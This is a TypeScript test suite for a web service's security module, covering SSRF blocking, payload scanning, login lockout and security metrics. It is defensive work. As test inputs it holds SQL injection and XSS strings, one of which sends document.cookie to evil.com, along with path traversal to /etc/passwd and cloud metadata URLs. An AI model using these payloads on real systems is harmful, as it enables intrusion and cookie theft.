/**
 * security.test.ts — Gate 6: Security Hardening Test Suite
 *
 * Tests SSRF protection, payload scanning, brute-force protection,
 * request fingerprinting, and security metrics collection.
 *
 * 52 test cases across 8 describe blocks.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

// ─── Mock redis before imports ─────────────────────────────────────────────────
const mockRedis = {
  get: vi.fn().mockResolvedValue(null),
  set: vi.fn().mockResolvedValue('OK'),
  setex: vi.fn().mockResolvedValue('OK'),
  del: vi.fn().mockResolvedValue(1),
  incr: vi.fn().mockResolvedValue(1),
  expire: vi.fn().mockResolvedValue(1),
  ttl: vi.fn().mockResolvedValue(-2),
  keys: vi.fn().mockResolvedValue([]),
}

vi.mock('../db/redis', () => ({ redis: mockRedis }))
vi.mock('../lib/logger', () => ({
  logger: {
    warn: vi.fn(),
    info: vi.fn(),
    error: vi.fn(),
  },
}))

import {
  checkSSRF,
  scanPayload,
  fingerprintRequest,
  checkLoginAttempt,
  recordFailedLogin,
  clearLoginAttempts,
  getSecurityMetrics,
  isPrivateIP,
  MAX_LOGIN_ATTEMPTS,
} from '../lib/security'

// ─── SSRF Protection ──────────────────────────────────────────────────────────

describe('checkSSRF', () => {
  it('allows normal HTTPS URLs', () => {
    const result = checkSSRF('https://api.example.com/data')
    expect(result.safe).toBe(true)
  })

  it('allows normal HTTP URLs', () => {
    const result = checkSSRF('http://data.gdeltproject.org/feed.csv')
    expect(result.safe).toBe(true)
  })

  it('blocks file:// scheme', () => {
    const result = checkSSRF('file:///etc/passwd')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('blocked_scheme:file:')
  })

  it('blocks ftp:// scheme', () => {
    const result = checkSSRF('ftp://internal.corp/secrets')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('blocked_scheme:ftp:')
  })

  it('blocks gopher:// scheme', () => {
    const result = checkSSRF('gopher://localhost:9000/_PING')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('blocked_scheme:gopher:')
  })

  it('blocks javascript: scheme', () => {
    const result = checkSSRF('javascript:alert(1)')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('blocked_scheme:javascript:')
  })

  it('blocks data: scheme', () => {
    const result = checkSSRF('data:text/html,<script>alert(1)</script>')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('blocked_scheme:data:')
  })

  it('blocks 127.0.0.1 (loopback)', () => {
    const result = checkSSRF('http://127.0.0.1:8080/admin')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })

  it('blocks 10.x.x.x (private range)', () => {
    const result = checkSSRF('http://10.0.0.5/internal')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })

  it('blocks 192.168.x.x (private range)', () => {
    const result = checkSSRF('http://192.168.1.1/router')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })

  it('blocks 172.16.x.x (private range)', () => {
    const result = checkSSRF('http://172.16.0.1/api')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })

  it('blocks AWS metadata endpoint 169.254.169.254', () => {
    const result = checkSSRF('http://169.254.169.254/latest/meta-data/')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })

  it('blocks localhost hostname', () => {
    const result = checkSSRF('http://localhost:3000/admin')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('internal_hostname')
  })

  it('blocks 0.0.0.0', () => {
    const result = checkSSRF('http://0.0.0.0:5432/')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('internal_hostname')
  })

  it('blocks Google cloud metadata', () => {
    const result = checkSSRF('http://metadata.google.internal/computeMetadata/v1/')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('internal_hostname')
  })

  it('blocks credentials in URL', () => {
    const result = checkSSRF('http://admin:password@example.com/api')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('credentials_in_url')
  })

  it('blocks URLs that are too long', () => {
    const longUrl = 'https://example.com/' + 'a'.repeat(5000)
    const result = checkSSRF(longUrl)
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('url_too_long')
  })

  it('rejects invalid URLs', () => {
    const result = checkSSRF('not_a_url_at_all')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('invalid_url')
  })

  it('blocks Docker bridge network', () => {
    const result = checkSSRF('http://172.17.0.2:5432/')
    expect(result.safe).toBe(false)
    expect(result.reason).toBe('private_ip')
  })
})

// ─── isPrivateIP ──────────────────────────────────────────────────────────────

describe('isPrivateIP', () => {
  it('detects IPv6 loopback', () => {
    expect(isPrivateIP('::1')).toBe(true)
  })

  it('detects IPv6 link-local', () => {
    expect(isPrivateIP('fe80::1')).toBe(true)
  })

  it('detects IPv6 ULA (fc00)', () => {
    expect(isPrivateIP('fc00::1')).toBe(true)
  })

  it('detects IPv4-mapped IPv6', () => {
    expect(isPrivateIP('::ffff:192.168.1.1')).toBe(true)
  })

  it('allows public IPv4', () => {
    expect(isPrivateIP('8.8.8.8')).toBe(false)
  })

  it('allows public IPv4 (93.x)', () => {
    expect(isPrivateIP('93.184.216.34')).toBe(false)
  })
})

// ─── Payload Scanning ─────────────────────────────────────────────────────────

describe('scanPayload — SQL injection', () => {
  it('detects UNION SELECT', () => {
    const result = scanPayload("' UNION SELECT * FROM users --")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('sqli')
  })

  it('detects OR 1=1', () => {
    const result = scanPayload("' OR 1=1 --")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('sqli')
  })

  it('detects DROP TABLE', () => {
    const result = scanPayload("; DROP TABLE users;")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('sqli')
  })

  it('detects SLEEP injection', () => {
    const result = scanPayload("1; SLEEP(5);")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('sqli')
  })

  it('detects BENCHMARK injection', () => {
    const result = scanPayload("BENCHMARK(1000000,SHA1('test'))")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('sqli')
  })

  it('passes clean text', () => {
    const result = scanPayload('Breaking news: earthquake in Turkey')
    expect(result.clean).toBe(true)
  })
})

describe('scanPayload — XSS', () => {
  it('detects <script> tag', () => {
    const result = scanPayload('<script>alert(1)</script>')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
  })

  it('detects javascript: protocol', () => {
    const result = scanPayload('javascript:alert(document.cookie)')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
  })

  it('detects onclick handler', () => {
    const result = scanPayload('<div onclick="alert(1)">')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
  })

  it('detects iframe injection', () => {
    const result = scanPayload('<iframe src="http://evil.com">')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
  })

  it('detects document.cookie access', () => {
    const result = scanPayload('var c = document.cookie; fetch(evil+c)')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
  })

  it('passes clean HTML entities', () => {
    const result = scanPayload('Temperature &gt; 100°F — breaking record')
    expect(result.clean).toBe(true)
  })
})

describe('scanPayload — path traversal', () => {
  it('detects ../', () => {
    const result = scanPayload('../../../etc/passwd')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('path_traversal')
  })

  it('detects ..\\', () => {
    const result = scanPayload('..\\..\\windows\\system32')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('path_traversal')
  })

  it('detects URL-encoded traversal (%2e%2e)', () => {
    const result = scanPayload('%2e%2e%2fetc%2fpasswd')
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('path_traversal')
  })

  it('passes clean file paths', () => {
    const result = scanPayload('/api/v1/signals/123')
    expect(result.clean).toBe(true)
  })
})

describe('scanPayload — combined threats', () => {
  it('detects multiple threat types in one payload', () => {
    const result = scanPayload("<script>fetch('http://evil.com?' + document.cookie)</script>; DROP TABLE users;")
    expect(result.clean).toBe(false)
    expect(result.threats).toContain('xss')
    expect(result.threats).toContain('sqli')
  })
})

// ─── Request Fingerprinting ───────────────────────────────────────────────────

describe('fingerprintRequest', () => {
  it('returns a 16-char hex string', () => {
    const fp = fingerprintRequest('1.2.3.4', 'Mozilla/5.0')
    expect(fp).toMatch(/^[0-9a-f]{16}$/)
  })

  it('produces consistent output for same input', () => {
    const fp1 = fingerprintRequest('1.2.3.4', 'Mozilla/5.0')
    const fp2 = fingerprintRequest('1.2.3.4', 'Mozilla/5.0')
    expect(fp1).toBe(fp2)
  })

  it('produces different output for different IPs', () => {
    const fp1 = fingerprintRequest('1.2.3.4', 'Mozilla/5.0')
    const fp2 = fingerprintRequest('5.6.7.8', 'Mozilla/5.0')
    expect(fp1).not.toBe(fp2)
  })

  it('produces different output for different user agents', () => {
    const fp1 = fingerprintRequest('1.2.3.4', 'Mozilla/5.0')
    const fp2 = fingerprintRequest('1.2.3.4', 'curl/7.68.0')
    expect(fp1).not.toBe(fp2)
  })
})

// ─── Brute-Force Protection ───────────────────────────────────────────────────

describe('checkLoginAttempt', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockRedis.ttl.mockResolvedValue(-2)
    mockRedis.get.mockResolvedValue(null)
  })

  it('allows login when no prior attempts', async () => {
    const result = await checkLoginAttempt('test@example.com')
    expect(result.allowed).toBe(true)
    expect(result.attemptsRemaining).toBe(MAX_LOGIN_ATTEMPTS)
  })

  it('blocks login when account is locked out', async () => {
    mockRedis.ttl.mockResolvedValue(600) // 10 min remaining
    const result = await checkLoginAttempt('test@example.com')
    expect(result.allowed).toBe(false)
    expect(result.attemptsRemaining).toBe(0)
    expect(result.lockoutEndsAt).toBeGreaterThan(Date.now())
  })

  it('allows login with some failed attempts below threshold', async () => {
    mockRedis.get.mockResolvedValue('5')
    const result = await checkLoginAttempt('test@example.com')
    expect(result.allowed).toBe(true)
    expect(result.attemptsRemaining).toBe(5)
  })

  it('blocks login at exact threshold', async () => {
    mockRedis.get.mockResolvedValue(String(MAX_LOGIN_ATTEMPTS))
    const result = await checkLoginAttempt('test@example.com')
    expect(result.allowed).toBe(false)
    expect(result.attemptsRemaining).toBe(0)
  })
})

describe('recordFailedLogin', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  it('increments the attempt counter', async () => {
    mockRedis.incr.mockResolvedValue(1)
    await recordFailedLogin('test@example.com')
    expect(mockRedis.incr).toHaveBeenCalledWith(expect.stringContaining('login_attempts'))
  })

  it('sets TTL on first attempt', async () => {
    mockRedis.incr.mockResolvedValue(1)
    await recordFailedLogin('test@example.com')
    expect(mockRedis.expire).toHaveBeenCalled()
  })

  it('does not set TTL on subsequent attempts', async () => {
    mockRedis.incr.mockResolvedValue(5)
    await recordFailedLogin('test@example.com')
    expect(mockRedis.expire).not.toHaveBeenCalled()
  })

  it('creates lockout at threshold', async () => {
    mockRedis.incr.mockResolvedValue(MAX_LOGIN_ATTEMPTS)
    await recordFailedLogin('test@example.com')
    expect(mockRedis.setex).toHaveBeenCalledWith(
      expect.stringContaining('lockout:'),
      expect.any(Number),
      '1',
    )
    expect(mockRedis.del).toHaveBeenCalled()
  })
})

describe('clearLoginAttempts', () => {
  it('deletes the attempts counter', async () => {
    await clearLoginAttempts('test@example.com')
    expect(mockRedis.del).toHaveBeenCalledWith(expect.stringContaining('login_attempts'))
  })
})

// ─── Security Metrics ─────────────────────────────────────────────────────────

describe('getSecurityMetrics', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockRedis.get.mockResolvedValue(null)
    mockRedis.keys.mockResolvedValue([])
  })

  it('returns zero counts when no events', async () => {
    const metrics = await getSecurityMetrics()
    expect(metrics.events_last_24h).toBeDefined()
    expect(metrics.active_lockouts).toBe(0)
    expect(metrics.total_blocked_requests).toBe(0)
  })

  it('counts active lockouts', async () => {
    mockRedis.keys.mockResolvedValue(['security:lockout:a', 'security:lockout:b'])
    const metrics = await getSecurityMetrics()
    expect(metrics.active_lockouts).toBe(2)
  })

  it('sums events across 24 hour windows', async () => {
    mockRedis.get.mockImplementation(async (key: string) => {
      if (key.includes('sqli_detected')) return '3'
      return null
    })
    const metrics = await getSecurityMetrics()
    expect(metrics.events_last_24h['sqli_detected']).toBeGreaterThan(0)
    expect(metrics.total_blocked_requests).toBeGreaterThan(0)
  })
})
